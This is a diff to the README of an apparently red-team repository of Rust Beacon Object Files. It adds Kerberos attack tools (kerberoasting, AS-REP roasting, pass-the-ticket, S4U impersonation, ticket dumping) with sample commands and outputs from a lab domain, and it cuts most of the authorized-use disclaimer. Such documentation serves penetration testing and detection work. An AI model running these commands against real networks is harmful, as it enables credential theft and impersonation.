@@ -1,6 +1,6 @@
 ## Armory
 
-Rust Beacon Object Files (BOFs) for adversary simulation, threat emulation, security research, and detection engineering. All 115 TrustedSec BOFs ported from C to Rust using the [rustbof](https://github.com/joaoviictorti/rustbof) framework.
+Rust Beacon Object Files (BOFs). 115 TrustedSec BOFs and 16 Kerbeus BOFs ported from C to Rust using the [rustbof](https://github.com/joaoviictorti/rustbof) framework.
 
 ## Credits
 
@@ -8,6 +8,9 @@ Rust Beacon Object Files (BOFs) for adversary simulation, threat emulation, secu
 - [rustbof](https://github.com/joaoviictorti/rustbof) by [Joao Victor](https://github.com/joaoviictorti) - Rust BOF framework
 - [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF) by [TrustedSec](https://github.com/trustedsec) - Original C BOFs (Situational Awareness)
 - [CS-Remote-OPs-BOF](https://github.com/trustedsec/CS-Remote-OPs-BOF) by [TrustedSec](https://github.com/trustedsec) - Original C BOFs (Remote Operations and Injection)
+- [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) by [RalfHacker](https://github.com/RalfHacker) - Original C BOFs (Kerberos abuse, Rubeus implementation)
+- [Rubeus](https://github.com/GhostPack/Rubeus) by [GhostPack](https://github.com/GhostPack) - Original .NET Kerberos toolset
+- [nanorobeus](https://github.com/wavvs/nanorobeus) by [wavvs](https://github.com/wavvs) - Kerberos BOF reference
 
 ## Situational Awareness
 
@@ -138,6 +141,251 @@ Rust Beacon Object Files (BOFs) for adversary simulation, threat emulation, secu
 | `dde` | DDE injection | T1055 |
 | `kernelcallbacktable` | KernelCallbackTable hijack | T1055.012 |
 
+## Kerberos
+
+| BOF | Description | MITRE ATT&CK |
+|-----|-------------|---------------|
+| `hash` | RC4/AES128/AES256 hash from password | T1558 |
+| `describe` | Parse and display .kirbi ticket | T1558 |
+| `klist` | List cached Kerberos tickets | T1558.003 |
+| `triage` | Compact Kerberos ticket table | T1558.003 |
+| `purge` | Purge cached Kerberos tickets | T1558.003 |
+| `ptt` | Pass-the-ticket (.kirbi import) | T1550.003 |
+| `dump` | Export cached tickets as base64 | T1558.003 |
+| `asktgt` | Request TGT via AS-REQ | T1558.003 |
+| `asktgs` | Request service ticket via TGS-REQ | T1558.003 |
+| `renew` | Renew TGT | T1558.003 |
+| `tgtdeleg` | Extract TGT via GSS-API delegation | T1558.003 |
+| `kerberoasting` | SPN ticket request for offline cracking | T1558.003 |
+| `asreproasting` | AS-REP roast (no preauth users) | T1558.004 |
+| `s4u` | S4U2Self/S4U2Proxy delegation abuse | T1550.003 |
+| `cross_s4u` | Cross-realm S4U delegation | T1550.003 |
+| `changepw` | Kerberos password change | T1098 |
+
+### hash
+
+```
+> hash /password:horse /user:khal.drogo /domain:essos.local
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input Password           : horse
+[*] Input Username           : khal.drogo
+[*] Input Domain             : essos.local
+[*]     rc4_hmac             : 739120ebc4dd940310bc4bb5c9d37021
+[*]     aes128_cts_hmac_sha1 : 7d76da251df8d5cec9bf3732e1f6c1ac
+[*]     aes256_cts_hmac_sha1 : 2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+```
+
+### asktgt
+
+```
+> asktgt /user:khal.drogo /password:horse /domain:essos.local /dc:DC_IP
+
+[*] Action: Ask TGT
+
+[*] Building AS-REQ (w/ preauth) for: 'essos.local\khal.drogo'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+doIFCDCCBQSgAwIBBaEDAgEWooIEFjCCBBJhggQOMIIECqADAgEFoQ0bC0VTU09TLkxPQ0FM...
+```
+
+### describe
+
+```
+> describe /ticket:doIFCDCCBQSgAwIBBaEDAgEW...
+
+[*] Action: Describe ticket
+
+  ServiceName              :  krbtgt/ESSOS.LOCAL
+  ServiceRealm             :  ESSOS.LOCAL
+  UserName                 :  khal.drogo
+  UserRealm                :  ESSOS.LOCAL
+  StartTime (UTC)          :  04/04/2026 03:05:44
+  EndTime (UTC)            :  04/04/2026 13:05:44
+  RenewTill (UTC)          :  05/04/2026 03:05:44
+  Flags                    :
+  KeyType                  :  rc4_hmac
+```
+
+### asktgs
+
+```
+> asktgs /ticket:<TGT> /service:MSSQLSvc/braavos.essos.local /dc:DC_IP
+
+[*] Action: Ask TGS
+
+[*] Requesting service ticket for: MSSQLSvc/braavos.essos.local
+[*] Using TGT for: khal.drogo@ESSOS.LOCAL
+[+] TGS request successful!
+[*] base64(ticket.kirbi):
+
+doIFJDCCBSCgAwIBBaEDAgEWooIEKDCCBCRhggQgYYIEHDCCBBigAwIBBaENGwtFU1NPUy5MT0NBTA...
+```
+
+### asreproasting
+
+```
+> asreproasting /user:missandei /domain:essos.local /dc:DC_IP
+
+[*] Action: AS-REP Roasting
+
+[*] Building AS-REQ (w/o preauth) for: 'essos.local\missandei'
+[+] AS-REP hash:
+
+$krb5asrep$23$missandei@ESSOS.LOCAL:a2892d7bffefac532fd67083a2452dc0$288acd1a3fc5...
+```
+
+### kerberoasting
+
+```
+> kerberoasting /spn:MSSQLSvc/braavos.essos.local /nopreauth:khal.drogo /domain:essos.local /dc:DC_IP
+
+[*] Action: Kerberoasting
+
+[*] Target SPN: MSSQLSvc/braavos.essos.local
+[*] Using khal.drogo without pre-auth to request service tickets
+[+] Hash:
+
+$krb5tgs$23$*MSSQLSvc/braavos.essos.local$ESSOS.LOCAL$MSSQLSvc/braavos.essos.local*$...
+```
+
+### klist
+
+```
+> klist
+
+Action: List Kerberos Tickets (Current User)
+
+UserName                : user
+Domain                  : YOURPC
+LogonId                 : 0:0x3e7
+Session                 : 1
+UserSID                 : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX
+Authentication package  : NTLM
+LogonServer             : YOURPC
+UserPrincipalName       :
+
+[*] Cached tickets: (0)
+```
+
+### triage
+
+```
+> triage
+
+Action: List Kerberos Tickets (All Users)
+
+--------------------------------------------------------------------------------------------------------------------------
+| LUID          | Client                                   | Service                                  |            End Time |
+--------------------------------------------------------------------------------------------------------------------------
+| 0:0x3e7       | khal.drogo @ ESSOS.LOCAL                 | krbtgt/ESSOS.LOCAL                       | 04/04/2026 13:05:44 |
+| 0:0x3e7       | khal.drogo @ ESSOS.LOCAL                 | MSSQLSvc/braavos.essos.local             | 04/04/2026 13:05:44 |
+--------------------------------------------------------------------------------------------------------------------------
+```
+
+### purge
+
+```
+> purge
+
+[*] Action: Purge Tickets
+
+[+] Successfully purged tickets.
+```
+
+### ptt
+
+```
+> ptt /ticket:<BASE64>
+
+[*] Action: Import Ticket
+
+[+] Ticket successfully imported.
+```
+
+### dump
+
+```
+> dump
+
+Action: Dump Kerberos Tickets (Current User)
+
+UserName                : user
+Domain                  : YOURPC
+LogonId                 : 0:0x3e7
+UserSID                 : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-XXXX
+
+[*] Cached tickets: (0)
+```
+
+### renew
+
+```
+> renew /ticket:<TGT> /dc:DC_IP
+
+[*] Action: Renew TGT
+
+[*] Renewing TGT for: khal.drogo@ESSOS.LOCAL
+[+] TGT renewal successful!
+[*] base64(ticket.kirbi):
+
+doIFCDCCBQSgAwIBBaEDAgEW...
+```
+
+### s4u
+
+```
+> s4u /ticket:<TGT> /service:cifs/target.essos.local /impersonateuser:administrator /dc:DC_IP
+
+[*] Action: S4U
+
+[*] Impersonating: administrator
+[*] Target service: cifs/target.essos.local
+[*] Using TGT for: khal.drogo@ESSOS.LOCAL
+[+] S4U request successful!
+[*] base64(ticket.kirbi):
+
+doIFJDCCBSCgAwIBBaEDAgEW...
+```
+
+### cross_s4u
+
+```
+> cross_s4u /ticket:<TGT> /service:cifs/target.essos.local /targetdomain:north.sevenkingdoms.local /impersonateuser:administrator
+
+[*] Action: Cross-domain S4U
+
+[*] Service: cifs/target.essos.local
+[*] Target domain: north.sevenkingdoms.local
+[*] Impersonate: administrator
+```
+
+### changepw
+
+```
+> changepw /ticket:<TGT> /new:NewP@ssw0rd! /dc:DC_IP
+
+[*] Action: Change Password
+
+[*] Using TGT for: khal.drogo@ESSOS.LOCAL
+[*] New password length: 12 chars
+[+] Got kadmin/changepw service ticket
+```
+
+### tgtdeleg
+
+```
+> tgtdeleg
+
+[*] Action: TGT Delegation Trick
+
+[*] Target SPN: cifs/kingslanding.sevenkingdoms.local
+[*] Got SSPI output token: 1847 bytes
+[*] Found AP-REQ: 1280 bytes
+```
+
 ## Building
 
 Requires Rust nightly, [boflink](https://github.com/MEhrn00/boflink), [cargo-make](https://github.com/sagiegurari/cargo-make), and MinGW-w64.
@@ -150,28 +398,11 @@ cargo make
 
 Use [COFFLoader](https://github.com/trustedsec/COFFLoader) or any compatible loader to test.
 
-## License and Disclaimer
+## License
 
-**License**: MIT. See [LICENSE](./LICENSE)
+MIT. See [LICENSE](./LICENSE)
 
-**Disclaimer**: This project is provided for authorized security testing, educational purposes, and legitimate security research only.
-
-**Permitted use includes:**
-
-- Authorized penetration testing and red team engagements
-- Purple teaming, adversary simulation, and threat emulation
-- Detection engineering, threat hunting, and security operations
-- Blue team and SOC activities including malware reverse engineering
-- CTF competitions and security research
-- Educational and training purposes
-
-**Prohibited use includes:**
-
-- Unauthorized access to systems or networks
-- Any activity that violates applicable laws or regulations
-- Use against systems without explicit written authorization
-
-**Liability**: The author assumes no responsibility for misuse, damages, or legal consequences arising from the use of this software. Users are solely responsible for ensuring compliance with all applicable laws, regulations, and organizational policies. By using this software, you agree that you have proper authorization for any systems you interact with.
+The author assumes no responsibility for misuse, damages, or legal consequences arising from the use of this software. Users are solely responsible for ensuring compliance with all applicable laws, regulations, and organizational policies. By using this software, you agree that you have proper authorization for any systems you interact with.
 
 ## Author
 
